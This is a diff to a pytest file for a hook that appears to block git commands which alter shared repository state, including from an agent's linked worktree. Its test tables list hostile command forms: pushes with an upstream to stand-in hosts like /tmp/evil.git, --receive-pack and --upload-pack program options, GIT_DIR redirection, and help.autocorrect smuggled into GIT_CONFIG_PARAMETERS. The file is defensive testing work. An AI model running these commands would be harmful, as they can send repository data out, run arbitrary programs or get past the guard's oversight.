@@ -2505,9 +2505,10 @@ _SUB = "{subrepo}"  # placeholder: the submodule's own repository
 #: *setup* runs first, outside the hook. *kinds* is the set of state names the run
 #: must change at least one of: config, refs, index, tree, gitmodules. *shared_only*
 #: marks the commands that deny in the shared tree but pass in a linked worktree
-#: with no other repository named: a worktree agent's own branches (the verb scan
-#: never covered them there), and `push|fetch|pull -u|--set-upstream`, which write
-#: only `branch.<b>.remote|merge`.
+#: with no other repository named: the branch copy, move and delete forms (not
+#: denied from a worktree, which cannot tell a shared branch from its own: a known
+#: limit), and the `HEAD`-sourced `push -u` and `fetch|pull --set-upstream` forms,
+#: which write only the current branch's `branch.<b>.remote|merge`.
 _SIDEFX_REAL: list[tuple[str, str, frozenset[str], bool]] = [
     # remote: every shape rewrites remote.<name>.*, shared by all worktrees
     ("git remote add up2 /tmp/zz", "", frozenset({"config"}), False),
@@ -2525,6 +2526,11 @@ _SIDEFX_REAL: list[tuple[str, str, frozenset[str], bool]] = [
     ("git -C . remote set-url origin /tmp/zz", "", frozenset({"config"}), False),
     ("git -c core.pager=cat remote set-url origin /tmp/zz", "", frozenset({"config"}), False),
     ("git -c 'user.name=a b' remote set-url origin /tmp/zz", "", frozenset({"config"}), False),
+    # a word that is another command's own verb, but sits in a global option's value
+    ("git --namespace lfs remote set-url origin /tmp/zz", "", frozenset({"config"}), False),
+    ("git --namespace notes branch -u origin/feat", "", frozenset({"config"}), False),
+    ("git --namespace notes submodule init", "", frozenset({"config"}), False),
+    ("git --attr-source lfs remote set-url origin /tmp/zz", "", frozenset({"config"}), False),
     # branch: upstream and tracking
     ("git branch -u origin/feat", "", frozenset({"config"}), False),
     ("git branch --set-upstream-to=origin/feat", "", frozenset({"config"}), False),
@@ -2779,7 +2785,7 @@ _SIDEFX_INNER = [
 #: but they pass in a linked worktree with no other repository named
 #: (`_SIDEFX_WT_UPSTREAM_PASS`), so the worktree-deny table leaves them out.
 _SIDEFX_UPSTREAM_INNER = [
-    "git push -u origin main",
+    "git push -u origin HEAD",
     "git fetch --set-upstream origin main",
 ]
 _SIDEFX_UPSTREAM_SPELLINGS = [
@@ -2789,6 +2795,7 @@ _SIDEFX_UPSTREAM_SPELLINGS = [
     "git push -fu origin main",
     "git push origin main -u",
     "git push origin main --set-upstream",
+    "git push -u origin HEAD",
     "git fetch --set-upstream origin main",
     "git fetch origin --set-upstream",
     "git pull --set-upstream origin main",
@@ -3126,8 +3133,9 @@ def test_the_sidefx_allow_shapes_are_not_denied_in_a_linked_worktree(linked_work
     assert not blocked, f"command(s) wrongly denied in a linked worktree: {blocked!r}"
 
 
-#: A linked worktree owns its branches: these deny in the shared tree only, as
-#: `branch -d/-D/-m` always have, and pass there.
+#: These deny in the shared tree only, as `branch -d/-D/-m` always have, and pass
+#: from a linked worktree. That is a pinned limit, not an enforced ownership: the
+#: text cannot tell a branch the agent made from a shared one.
 _SIDEFX_SHARED_ONLY = [
     "git branch -c a b",
     "git branch -C a b",
@@ -3154,22 +3162,43 @@ def test_branch_ref_and_config_writers_of_the_agents_own_branches_pass_in_a_work
 #: `git push -u origin <branch>` is the documented flow for a worktree's branch and
 #: writes only `branch.<b>.remote|merge`, keys that run no code, so it passes from a
 #: provable linked worktree that names no other repository. The shared tree denies it.
+_WT_BRANCH = "wt-branch"  # the branch the `linked_worktree` fixture is on
 _SIDEFX_WT_UPSTREAM_PASS = [
-    "git push -u origin feature/x",
+    "git push -u",
+    "git push -u origin",
+    f"git push -u origin {_WT_BRANCH}",
+    f"git push -u origin refs/heads/{_WT_BRANCH}",
+    f"git push -u origin +{_WT_BRANCH}",
+    f"git push -u origin {_WT_BRANCH}:newb",
     "git push --set-upstream origin HEAD",
     "git push --set-up origin HEAD",
     "git push -u origin HEAD:newb",
-    "git push -fu origin x",
-    "git push origin x -u",
-    "git push -u -o ci.skip origin x",
-    "git push -u --force-with-lease origin x",
-    "git -c core.pager=cat push -u origin x",
+    "git push -u origin HEAD:refs/heads/newb",
+    "git push -fu origin HEAD",
+    "git push origin HEAD -u",
+    "git push -u -o ci.skip origin HEAD",
+    "git push -u --push-option=ci.skip origin HEAD",
+    "git push -u --force-with-lease origin HEAD",
+    "git push -u --force-with-lease=x:y origin HEAD",
+    "git push -u --no-verify upstream HEAD",
+    "git -c core.pager=cat push -u origin HEAD",
     "git fetch --set-upstream origin main",
+    "git fetch --set-upstream",
     "git fetch origin --set-upstream",
+    "git fetch --set-upstream --depth 1 origin main",
     "git pull --set-upstream origin main",
-    "git push -u origin x && git status",
-    "true; git push -u origin x",
-    "(git push -u origin x)",
+    "git pull --set-upstream --ff-only origin main",
+    f"git push -u origin {_WT_BRANCH} 2>&1 | tail -3",
+    "git push -u origin HEAD > /dev/null 2>&1",
+    "git push -u origin HEAD 2>/dev/null",
+    "git push -u origin HEAD &> /dev/null",
+    "git push -u 2>&1 origin HEAD",
+    "git push -u origin HEAD >&2",
+    "git push -q -u origin HEAD 2>&1 | tail -2; git status -sb | head -2",
+    "git push -u origin HEAD 2>&1 | tail -3",
+    "git push -u origin HEAD && git status",
+    "true; git push -u origin HEAD",
+    "(git push -u origin HEAD)",
 ]
 
 
@@ -3198,36 +3227,36 @@ def _other_repo_upstream_cmds(primary: pathlib.Path) -> list[str]:
     the primary (or any other repository) by option, variable, `cd` or `env -C`."""
     p = str(primary)
     return [
-        f"git -C {p} push -u origin x",
-        f"git -C{p} push -u origin x",
-        f"git -c user.name=x -C {p} push -u origin x",
-        f"git -C . push -u origin x",
-        f"git --git-dir={p}/.git push -u origin x",
-        f"git --git-dir {p}/.git push -u origin x",
-        f"git --work-tree={p} push -u origin x",
-        f"git --work-tree {p} push --set-upstream origin x",
-        f"git -C {p} fetch --set-upstream origin x",
-        f"git -C {p} pull --set-upstream origin x",
-        f"GIT_DIR={p}/.git git push -u origin x",
-        f"GIT_COMMON_DIR={p}/.git git push -u origin x",
-        f"GIT_WORK_TREE={p} git push -u origin x",
-        f"env GIT_DIR={p}/.git git push -u origin x",
-        f"export GIT_DIR={p}/.git; git push -u origin x",
-        f"GIT_DIR={p}/.git; export GIT_DIR; git fetch --set-upstream origin x",
-        f"env GIT_DIR'='{p}/.git git push -u origin x",
-        f"cd '{p}' && git push -u origin x",
-        f'cd "{p}" && git push --set-upstream origin x',
-        f"env -C {p} git push -u origin x",
-        f"env --chdir={p} git push -u origin x",
-        "git $G push -u origin x",
-        'git "$G" push -u origin x',
-        "git ${G} push -u origin x",
-        "git $(echo -C /p) push -u origin x",
-        f"git --exec-path={p} push -u origin x",
-        f"sh -c 'git -C {p} push -u origin x'",
-        f"sh -c 'GIT_DIR={p}/.git git push -u origin x'",
+        f"git -C {p} push -u origin HEAD",
+        f"git -C{p} push -u origin HEAD",
+        f"git -c user.name=x -C {p} push -u origin HEAD",
+        f"git -C . push -u origin HEAD",
+        f"git --git-dir={p}/.git push -u origin HEAD",
+        f"git --git-dir {p}/.git push -u origin HEAD",
+        f"git --work-tree={p} push -u origin HEAD",
+        f"git --work-tree {p} push --set-upstream origin HEAD",
+        f"git -C {p} fetch --set-upstream origin HEAD",
+        f"git -C {p} pull --set-upstream origin HEAD",
+        f"GIT_DIR={p}/.git git push -u origin HEAD",
+        f"GIT_COMMON_DIR={p}/.git git push -u origin HEAD",
+        f"GIT_WORK_TREE={p} git push -u origin HEAD",
+        f"env GIT_DIR={p}/.git git push -u origin HEAD",
+        f"export GIT_DIR={p}/.git; git push -u origin HEAD",
+        f"GIT_DIR={p}/.git; export GIT_DIR; git fetch --set-upstream origin HEAD",
+        f"env GIT_DIR'='{p}/.git git push -u origin HEAD",
+        f"cd '{p}' && git push -u origin HEAD",
+        f'cd "{p}" && git push --set-upstream origin HEAD',
+        f"env -C {p} git push -u origin HEAD",
+        f"env --chdir={p} git push -u origin HEAD",
+        "git $G push -u origin HEAD",
+        'git "$G" push -u origin HEAD',
+        "git ${G} push -u origin HEAD",
+        "git $(echo -C /p) push -u origin HEAD",
+        f"git --exec-path={p} push -u origin HEAD",
+        f"sh -c 'git -C {p} push -u origin HEAD'",
+        f"sh -c 'GIT_DIR={p}/.git git push -u origin HEAD'",
         # a clean push in the same command does not excuse the other-repository one
-        f"git push -u origin x; git -C {p} push -u origin y",
+        f"git push -u origin HEAD; git -C {p} push -u origin HEAD",
     ]
 
 
@@ -3238,6 +3267,208 @@ def test_a_worktree_upstream_form_that_names_another_repository_still_denies(
     assert len(cmds) >= 25, f"the table shrank to {len(cmds)}"
     leaked = _not_denied(cmds, linked_worktree)
     assert not leaked, f"{len(leaked)} command(s) were NOT denied from a linked worktree: {leaked!r}"
+
+
+def _foreign_upstream_cmds(primary: pathlib.Path) -> list[str]:
+    """A worktree `push|fetch|pull -u|--set-upstream` whose remote is not a plain
+    remote name, whose refspec writes a branch the worktree does not own, or that
+    carries an option naming a repository or a program to run. Each one writes a
+    shared branch's upstream to an arbitrary place, or runs a program (the
+    first-positional-only check let all of them through)."""
+    p = str(primary)
+    return [
+        # a path or URL as the remote
+        "git push -u /tmp/evil.git develop",
+        "git push -u ssh://evil/x.git develop",
+        f"git push -u {p} x",
+        "git push -u user@host:repo HEAD",
+        "git push -u ../x HEAD",
+        "git push -u ./x HEAD",
+        "git push -u ~/x HEAD",
+        "git push -u . HEAD",
+        "git push -u .. HEAD",
+        "git push -u $R HEAD",
+        'git push -u "$R" HEAD',
+        "git push -u ${R} HEAD",
+        "git push -u 'a b' HEAD",
+        "git push -u origin/x HEAD",
+        "git push -u -- /tmp/evil.git HEAD",
+        "git push -u -f /tmp/evil.git HEAD",
+        "git push -u --force /tmp/evil.git HEAD",
+        "git push -u -o ci.skip /tmp/evil.git HEAD",
+        "git push -u --push-option ci.skip /tmp/evil.git HEAD",
+        "git fetch --set-upstream /tmp/evil.git develop",
+        "git fetch --set-upstream ssh://evil/x.git develop",
+        "git fetch /tmp/evil.git --set-upstream develop",
+        "git pull --set-upstream /tmp/evil.git develop",
+        "git pull --set-upstream git@host:o/r.git main",
+        # an option that names the repository or a program to run
+        "git push -u --repo=/tmp/evil.git",
+        "git push -u --repo /tmp/evil.git",
+        "git push -u --repo=origin HEAD",
+        "git push -u --receive-pack=/tmp/rp.sh /tmp/e.git HEAD",
+        "git push -u --receive-pack=/tmp/rp.sh origin HEAD",
+        "git push -u --receive-pack /tmp/rp.sh origin HEAD",
+        "git push -u --exec=/tmp/rp.sh origin HEAD",
+        "git push -u --exec /tmp/rp.sh origin HEAD",
+        "git push -u origin HEAD --exec=/tmp/rp.sh",
+        "git push -u --rec=/tmp/rp.sh origin HEAD",
+        "git fetch --set-upstream --upload-pack=/tmp/up.sh origin main",
+        "git fetch --set-upstream --upload-pack /tmp/up.sh origin main",
+        "git fetch --set-upstream origin main --upload-pack=/tmp/up.sh",
+        "git pull --set-upstream --upload-pack=/tmp/up.sh origin main",
+        "git pull --set-upstream --upload-pack /tmp/up.sh origin main",
+        "git pull --set-upstream --exec=/tmp/up.sh origin main",
+        # an option the check does not know may take a value: its value would be
+        # read as the remote, and the real remote hides behind it
+        "git fetch --set-upstream --depth 1 /tmp/evil.git x",
+        "git fetch --set-upstream -j 4 /tmp/evil.git x",
+        "git fetch --set-upstream --frobnicate /tmp/evil.git x",
+        "git push -u --frobnicate /tmp/evil.git HEAD",
+        "git push -u --signed=if-asked --frobnicate /tmp/evil.git HEAD",
+        # a refspec that writes the upstream of a branch the worktree does not own
+        "git push -u origin develop",
+        "git push -u origin +develop",
+        "git push -u origin develop:develop",
+        "git push -u origin refs/heads/develop",
+        "git push -u origin HEAD develop",
+        f"git push -u origin {_WT_BRANCH} develop",
+        f"git push -u origin develop {_WT_BRANCH}",
+        f"git push -u origin {_WT_BRANCH}2",
+        f"git push -u origin x{_WT_BRANCH}",
+        f"git push -u origin :{_WT_BRANCH}",
+        f"git push -u origin develop:{_WT_BRANCH}",
+        "git push -u origin $B",
+        "git push -u origin 'HEAD x'",
+        "git push -u --all origin",
+        "git push -u origin --all",
+        "git push -u 2>&1 /tmp/evil.git HEAD",
+        "git push -u >/dev/null /tmp/evil.git HEAD",
+        "git push -u 2> /dev/null /tmp/evil.git HEAD",
+        "git push -u &> /dev/null /tmp/evil.git HEAD",
+        "git push -u >&2 /tmp/evil.git HEAD",
+        "git push -u 2>&1 --receive-pack=/tmp/rp.sh origin HEAD",
+        "git push -u 2>&1 origin develop",
+        "git push -u origin develop 2>&1 | tail -3",
+        "git push -u origin main:feat2",
+        "git push -u origin develop:other",
+        "git push -u origin 'refs/heads/*:refs/heads/*'",
+        "git push -u origin refs/heads/*:refs/heads/*",
+        "git push -u origin --tags refs/heads/*:refs/heads/*",
+        "git push -u origin --tags develop",
+        "git push -u file:///tmp/evil.git HEAD",
+        "git push -u -- 'a b' HEAD",
+        "git push -u --mirror origin",
+        "git push -u --branches origin",
+        "git push -u --al origin",
+    ]
+
+
+def test_a_worktree_upstream_form_with_a_foreign_remote_refspec_or_program_option_denies(
+    shared_repo, linked_worktree,
+):
+    cmds = _foreign_upstream_cmds(shared_repo)
+    assert len(cmds) >= 60, f"the table shrank to {len(cmds)}"
+    leaked = _not_denied(cmds, linked_worktree)
+    assert not leaked, f"{len(leaked)} command(s) were NOT denied from a linked worktree: {leaked!r}"
+    leaked = _not_denied(cmds, shared_repo)
+    assert not leaked, f"{len(leaked)} command(s) were NOT denied in the shared tree: {leaked!r}"
+
+
+_OTHER = {"branch.other.remote", "branch.other.merge"}
+_MAIN = {"branch.main.remote", "branch.main.merge"}
+_WTB = {"branch.wtb.remote", "branch.wtb.merge"}
+
+
+@pytest.mark.parametrize("cmd,keys,denied", [
+    ("{g} -u {bare} other", _OTHER, True),
+    ("{g} -u {bare} HEAD", _WTB, False),
+    ("{g} -u {path} other", _OTHER, True),
+    ("{g} -u {path} HEAD", _WTB, True),
+    ("{g} -u {url} HEAD", _WTB, True),
+    ("{g} -u {bare} main:feat2", _MAIN, True),
+    ("{g} -u {bare} +main:feat2", _MAIN, True),
+    ("{g} -u --all {bare}", _OTHER | _WTB, True),
+    ("{g} -u {bare} --all", _OTHER | _WTB, True),
+    ("{g} -u --mirror {bare}", _OTHER | _WTB, True),
+    ("{g} -u {bare} 'refs/heads/*:refs/heads/*'", _OTHER | _WTB, True),
+    ("{g} -u {bare} --tags 'refs/heads/*:refs/heads/*'", _OTHER | _WTB, True),
+    ("{f} --set-upstream {path} main", _WTB, True),
+    ("{f} --set-upstream {url} main", _WTB, True),
+], ids=["named-shared", "named-own-control", "path-shared", "path-own", "url-own",
+        "named-shared-src-other-dst", "named-shared-force-src", "all", "all-after", "mirror",
+        "glob", "tags-glob", "path-fetch", "url-fetch"])
+def test_a_worktree_upstream_form_that_writes_a_shared_branch_or_a_path_really_does_and_denies(
+    cmd, keys, denied, tmp_path,
+):
+    """The review's finding, measured. From a worktree on `wtb`, an upstream push
+    of `other` writes `branch.other.*` (a SHARED branch of the primary), so do
+    `main:feat2` (the source decides, not the destination), `--all`, `--mirror`
+    and a glob refspec; a path or URL as the remote writes it as the branch's
+    remote. The own-branch form against a named remote is the control: it passes."""
+    env, main, cwd = _sidefx_box(tmp_path / "box", "wt")
+    bare = tmp_path / "box" / "bare.git"
+    subprocess.run(["git", "init", "-q", "--bare", str(bare)], env=env, check=True, capture_output=True)
+    subprocess.run(["git", "remote", "add", "bare", str(bare)], cwd=main, env=env, check=True)
+    subprocess.run(["git", "push", "-q", "bare", "main"], cwd=main, env=env, check=True, capture_output=True)
+    real = (
+        cmd.replace("{g}", "git push").replace("{f}", "git fetch").replace("{bare}", "bare")
+        .replace("{path}", str(bare)).replace("{url}", "file://" + str(bare))
+    )
+    common = main / ".git" / "config"
+    before = _config_keys(common, env)
+    proc = subprocess.run(["bash", "-c", real], cwd=cwd, env=env, capture_output=True, timeout=60, check=False)
+    assert proc.returncode == 0, proc.stderr
+    after = _config_keys(common, env)
+    changed = {k for k in before.keys() | after.keys() if before.get(k) != after.get(k)}
+    assert keys <= changed, f"{real!r} changed {sorted(changed)}, wanted at least {sorted(keys)}"
+    assert all(k.startswith("branch.") for k in changed), sorted(changed)
+    if not denied:
+        assert changed == keys, sorted(changed)
+    assert _denied(real, cwd) == denied, f"{real!r}: changed {sorted(changed)}, denied={not denied}"
+
+
+def _own_verb_hidden_cmds() -> list[str]:
+    """`stash`, `lfs`, `subtree` and `notes` are a command's own verb only as the
+    subcommand word. As the value of a global option, or the directory of `-C`, they
+    are no command at all, and the verb after them is git's."""
+    return [
+        "git --namespace lfs remote set-url origin /tmp/zz",
+        "git --namespace notes branch -u origin/feat",
+        "git --namespace notes submodule init",
+        "git --namespace stash remote add x /tmp/zz",
+        "git --attr-source lfs remote set-url origin /tmp/zz",
+        "git --attr-source subtree branch --set-upstream-to=origin/feat",
+        "git -C notes remote set-url origin /tmp/zz",
+        "git -C lfs branch -u origin/feat",
+        "git -c k=v --namespace notes remote rm origin",
+        "git --namespace subtree fetch --set-upstream /tmp/evil.git develop",
+        "git --namespace notes push -u /tmp/evil.git develop",
+        "git --namespace lfs maintenance start",
+        "git --namespace stash checkout -t origin/feat",
+    ]
+
+
+def test_an_own_verb_word_that_is_not_the_subcommand_hides_nothing(shared_repo, linked_worktree):
+    cmds = _own_verb_hidden_cmds()
+    assert _not_denied(cmds, shared_repo) == []
+    assert _not_denied(cmds, linked_worktree) == []
+
+
+def test_an_own_verb_word_that_is_the_subcommand_still_owns_the_next_word(linked_worktree):
+    """The control for the test above: the skip is not removed, only anchored."""
+    cmds = [
+        "git stash push -u -m wip",
+        "git -c core.pager=cat stash push -u",
+        "git --no-pager stash push -u",
+        "git --namespace n stash push -u",
+        "git -C . stash push -u",
+        "git lfs pull",
+        "git --namespace n lfs pull",
+        "git subtree push --prefix=x origin main",
+        "git notes push",
+    ]
+    assert _denied_among(cmds, linked_worktree) == []
 
 
 def _config_keys(cfg: pathlib.Path, env: dict[str, str]) -> dict[str, str]:
@@ -3326,8 +3557,8 @@ def test_a_verb_word_after_stash_lfs_subtree_or_notes_is_that_commands_own(linke
     ], linked_worktree) == []
     # ... and a push -u after one passes, as it does alone
     assert _denied_among([
-        "git stash push -u -m wip; git push -u origin x",
-        "git stash list && git push -u origin x",
+        "git stash push -u -m wip; git push -u origin HEAD",
+        "git stash list && git push -u origin HEAD",
     ], linked_worktree) == []
 
 
@@ -3399,6 +3630,49 @@ def test_help_autocorrect_values_that_cannot_run_a_typo_pass_and_the_rest_deny(s
     risky = ["1", "5", "10", "immediate", "prompt", "true", "yes", "on", "-1", "", "Immediate", "$X"]
     assert _denied_among([f"git -c help.autocorrect={v} status" for v in safe], shared_repo) == []
     assert _not_denied([f"git -c help.autocorrect={v} status" for v in risky], shared_repo) == []
+
+
+def _autocorrect_params_cmds() -> list[str]:
+    """`GIT_CONFIG_PARAMETERS` names `help.autocorrect` anywhere in its value: past a
+    long entry, or after a quoted entry that holds a shell break."""
+    pad = "x" * 500
+    tail = " git confg user.name x"
+    return [
+        f"GIT_CONFIG_PARAMETERS=\"'core.k{pad}=1' 'help.autocorrect=immediate'\"{tail}",
+        f"GIT_CONFIG_PARAMETERS=\"'core.k{pad}=1' 'help.autocorrect=1'\"{tail}",
+        f"export GIT_CONFIG_PARAMETERS=\"'core.k{pad}=1' 'help.autocorrect=immediate'\"; git confg user.name x",
+        f"env GIT_CONFIG_PARAMETERS=\"'core.k{pad}=1' 'help.autocorrect=immediate'\"{tail}",
+        "GIT_CONFIG_PARAMETERS=\"'core.a=b;c' 'help.autocorrect=immediate'\"" + tail,
+        "GIT_CONFIG_PARAMETERS=\"'core.a=b|c' 'help.autocorrect=immediate'\"" + tail,
+        "GIT_CONFIG_PARAMETERS=\"'core.a=b&c' 'help.autocorrect=immediate'\"" + tail,
+        "GIT_CONFIG_PARAMETERS=\"'core.a=b\nc' 'help.autocorrect=immediate'\"" + tail,
+        "GIT_CONFIG_PARAMETERS=\"'HELP.AutoCorrect=immediate'\"" + tail,
+        "GIT_CONFIG_PARAMETERS=\"'help.autocorrect'='immediate'\"" + tail,
+        "GIT_CONFIG_PARAMETERS=\"'help.autocorrect=0'\"" + tail,
+    ]
+
+
+def test_a_help_autocorrect_in_git_config_parameters_denies_wherever_it_sits(
+    shared_repo, linked_worktree,
+):
+    cmds = _autocorrect_params_cmds()
+    assert _not_denied(cmds, shared_repo) == []
+    assert _not_denied(cmds, linked_worktree) == []
+    # the value cannot be known, so none of these is excused; a command that sets the
+    # variable without that key is not touched
+    for ok in ("GIT_CONFIG_PARAMETERS=\"'core.pager=cat'\" git status", "git status"):
+        assert not _denied(ok, linked_worktree), ok
+
+
+def test_help_autocorrect_in_git_config_parameters_past_a_long_entry_really_runs_the_typo(tmp_path):
+    """The premise of the long-entry and shell-break rows, measured: git reads the
+    key after a 500-character entry and after `;`, and runs `confg` as `config`."""
+    for i, cmd in enumerate(_autocorrect_params_cmds()[:1] + _autocorrect_params_cmds()[4:5]):
+        env, main, _ = _sidefx_box(tmp_path / f"p{i}", "main")
+        before = _sidefx_state(main, main)
+        subprocess.run(["bash", "-c", cmd], cwd=main, env=env, capture_output=True, text=True, check=False, timeout=30)
+        assert _sidefx_state(main, main) != before, cmd
+        assert _denied(cmd, main), cmd
 
 
 def test_help_autocorrect_set_to_a_value_git_runs_really_runs_the_typo_and_a_safe_one_does_not(tmp_path):
